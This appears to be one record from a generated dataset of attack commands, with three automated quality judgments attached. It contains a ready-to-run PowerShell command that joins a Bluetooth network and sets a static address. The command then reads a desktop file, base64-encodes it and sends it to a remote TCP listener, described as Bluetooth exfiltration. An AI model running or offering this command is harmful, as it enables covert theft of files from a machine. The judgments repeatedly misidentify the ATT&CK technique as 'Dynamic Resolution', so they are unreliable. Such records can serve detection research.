command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Desktop\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()
explanation: Encodes content and sends it over a custom TCP service bound to the Bluetooth interface, ensuring exfiltration flows over the Bluetooth medium (T1011).
rationale_steps: Configure the Bluetooth NIC with a static address via netsh.
Bind the TCP socket to the Bluetooth IP to constrain medium.
Transmit base64 payload wrapped in innocuous markers over a high port.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for variable assignments, method calls, and piping.
llm_judgments.semantic_justification: While the command does establish a Bluetooth connection and exfiltrate data over it, it doesn't implement the dynamic resolution technique (T1011) as claimed since it uses static IP addresses (172.29.61.1/2) rather than algorithmically determining endpoints.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax for external executable calls, variable assignment, .NET method invocations, and command chaining.
llm_judgments.semantic_justification: The command is misaligned with MITRE ATT&CK T1011 (Dynamic Resolution) as it uses hardcoded MAC and IP addresses rather than dynamically determined endpoints, and the `netsh` command requires administrative privileges, which contradicts the stated 'Privilege: None' and makes the command operationally implausible.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced quoting, valid separators, and correct use of external tools and .NET classes.
llm_judgments.semantic_justification: It performs fixed-endpoint exfiltration over a Bluetooth PAN with a static IP and TCP, not dynamic resolution (no DGA/fast-flux/DNS behavior), and would likely fail without admin rights for the netsh IP change.
